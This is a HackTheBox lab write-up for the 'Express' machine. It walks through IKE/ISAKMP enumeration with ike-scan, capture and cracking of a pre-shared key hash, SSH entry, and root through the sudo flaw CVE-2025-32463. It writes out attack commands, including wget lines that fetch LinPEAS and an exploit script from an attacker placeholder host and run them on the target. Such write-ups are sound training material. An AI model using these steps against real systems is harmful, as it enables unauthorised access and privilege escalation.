# 🛣️ HackTheBox — Express

> **Difficulty:** Medium | **OS:** Linux | **Category:** Network / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [TCP Port Scanning](#tcp-port-scanning)
  * [UDP Port Scanning](#udp-port-scanning)
- [Exploitation](#exploitation)
  * [ISAKMP Enumeration — ike-scan](#isakmp-enumeration--ike-scan)
  * [PSK Hash Extraction](#psk-hash-extraction)
  * [Cracking the PSK — psk-crack](#cracking-the-psk--psk-crack)
  * [SSH Access as `ike`](#ssh-access-as-ike)
- [Privilege Escalation](#privilege-escalation)
  * [Manual Enumeration](#manual-enumeration)
  * [Automated Enumeration — LinPEAS](#automated-enumeration--linpeas)
  * [CVE-2025-32463 — Sudo Exploitation](#cve-2025-32463--sudo-exploitation)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Express** is a HackTheBox machine that departs from the typical web attack surface, instead exposing an **IKE/ISAKMP VPN service over UDP**. Enumeration of the IKE service reveals a user identity, which is then used to capture and crack a Pre-Shared Key (PSK) hash — granting SSH access. Privilege escalation exploits a known vulnerability in the installed version of `sudo` (CVE-2025-32463), which a public PoC converts into a root shell.

---

## Reconnaissance

### TCP Port Scanning

A full TCP scan of the target revealed a single open port:

```
PORT   STATE SERVICE
22/tcp open  ssh
```

> **Key Finding:** With only SSH exposed over TCP, no web attack surface was available. A UDP scan was warranted.

---

### UDP Port Scanning

A targeted UDP scan surfaced an additional service:

```
PORT    STATE SERVICE
500/udp open  isakmp
```

> **Key Finding:** UDP port `500` is the standard port for **ISAKMP** (Internet Security Association and Key Management Protocol), the control plane for IKE-based VPN negotiation. This was the intended attack vector.

---

## Exploitation

### ISAKMP Enumeration — ike-scan

The `ike-scan` tool was used to probe the IKE service and enumerate supported transforms and identities:

```
ike-scan -A <TARGET IP>
```

The scan response revealed the presence of a user identity associated with the domain:

```
ike@expressway.htb
```

> **Key Finding:** The identity hint provided the username required to extract the PSK hash in aggressive mode.

---

### PSK Hash Extraction

With the discovered identity, `ike-scan` was re-run in aggressive mode to capture the Pre-Shared Key hash and write it to disk:

```
sudo ike-scan -A --id=ike@expressway.htb -Ppresharedkey.txt <TARGET IP>
```

The IKE aggressive mode handshake was captured and the hash was saved to `presharedkey.txt`.

---

### Cracking the PSK — psk-crack

The captured PSK hash was cracked using `psk-crack` with the rockyou wordlist:

```
sudo psk-crack -d /usr/share/wordlists/rockyou.txt presharedkey.txt
```

```
<REDACTED PASSWORD>   (1 hash cracked)
```

The Pre-Shared Key was successfully recovered.

---

### SSH Access as `ike`

The cracked PSK was used as the SSH password for the `ike` user:

```
ssh ike@<TARGET>
```

Access was confirmed. The **user flag** was located and retrieved:

```
$ cat /home/ike/user.txt
HTB{REDACTED}
```

---

## Privilege Escalation

### Manual Enumeration

Standard enumeration checks were performed after gaining shell access:

```
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Neither sudo permissions nor interesting SUID binaries surfaced anything exploitable at this stage.

---

### Automated Enumeration — LinPEAS

LinPEAS was uploaded and executed to perform a broader sweep of the system:

```
wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

The output flagged the installed version of `sudo` as potentially vulnerable, highlighting it in a high-severity finding.

---

### CVE-2025-32463 — Sudo Exploitation

The version of `sudo` installed on the system was confirmed to be vulnerable to **CVE-2025-32463** — a local privilege escalation flaw in sudo's handling of specific execution conditions.

A public Proof-of-Concept was downloaded, transferred to the target, and executed:

```
wget http://<ATTACKER>:8000/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
/tmp/exploit.sh
```

The exploit resulted in a **root shell**. The root flag was retrieved to complete the machine:

```
# cat /root/root.txt
HTB{REDACTED}
```

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🏳️ **User** | `HTB{REDACTED}` |
| 🚩 **Root**  | `HTB{REDACTED}` |

---

## Summary

| Stage                    | Technique                                                                        |
| ------------------------ | -------------------------------------------------------------------------------- |
| **Recon**                | `nmap` TCP + UDP scan, `ike-scan` IKE enumeration                                |
| **Initial Access**       | IKE aggressive mode PSK hash capture → `psk-crack` with rockyou                 |
| **Lateral Movement**     | SSH login as `ike` with cracked PSK                                              |
| **Privilege Escalation** | CVE-2025-32463 — sudo local privilege escalation via public PoC → root shell     |

---

*Writeup by Aryan Barkhordar*
